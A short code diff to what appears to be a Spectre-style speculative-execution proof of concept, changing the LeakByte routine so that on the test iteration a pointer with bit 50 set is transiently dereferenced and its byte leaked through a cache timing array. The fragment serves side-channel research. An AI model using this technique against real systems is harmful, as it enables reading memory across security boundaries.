@@ -74,7 +74,13 @@ static char LeakByte(const char *data, size_t offset) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the 2048th iteration, when the
         // condition is false!
-        ForceRead(&timing_array[data[local_offset]]);
+
+        // nosajmik: during training runs, this is data[local_offset].
+        // On test run, the data pointer is added with local_offset but then bit 50
+        // is also set. The resulting pointer is transiently dereferenced.
+        char index = *(data + local_offset + !static_cast<bool>((i + 1) % 2048) * (1ULL << 50));
+        ForceRead(&timing_array[index]);
+        // ForceRead(&timing_array[data[local_offset]]);
       }
     }
 
